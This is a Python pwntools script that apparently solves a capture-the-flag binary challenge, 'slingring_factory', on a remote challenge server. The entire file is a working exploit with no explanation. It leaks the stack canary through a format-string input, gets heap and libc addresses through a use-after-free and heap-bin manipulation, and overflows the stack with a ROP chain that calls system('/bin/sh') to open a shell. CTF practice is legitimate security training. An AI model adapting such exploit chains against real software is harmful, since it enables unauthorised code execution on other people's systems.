from pwn import *

if args.LOCAL:
    io = process("./slingring_factory")
    if args.GDB:
        cmd = """

        """
        gdb.attach(io, cmd)
else:
    io = remote("challs.nusgreyhats.org", 35678)
    
libc = ELF('./libc.so.6')
pause()
io.sendline("%7$p")

def show():
    io.sendline(b'1')
    io.send(b'\n')
def forge(idx,byt , c):
    io.sendline(b'2')
    sleep(0.1)
    io.sendline(str(idx).encode())
    sleep(0.1)
    io.sendline(byt)
    sleep(0.1)
    io.sendline(c)
    io.send(b'\n')
    
def discard(idx):
    io.sendline(b'3')
    sleep(0.1)
    io.sendline(str(idx).encode())
    sleep(0.1)
    # io.send(b'\n')
io.recvuntil(b'Hello, ')

canary = int(io.recv(18), 16)
print(hex(canary))

forge(0, b'A', b'1')
discard(0)
show()
io.recvuntil(b'[1]   | ')
heap = u64(io.recv(5)+b'\0\0\0') << 12
print(hex(heap))

for i in range(10):
    forge(i, b'A', b'1') 
    
for i in range(9):
    discard(i+1)
show()
io.recvuntil(b'\xe0')

libc.address = u64(b'\xe0'+io.recv(5)+b'\0\0') - 0x21ace0

print(hex(libc.address))

io.sendline(b'4')

io.sendline(b'1')

io.sendline(b'A'*56+p64(canary)+p64(0)+p64(libc.address+0x000000000002a3e5+1)+p64(libc.address+0x000000000002a3e5)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym.system))

io.interactive()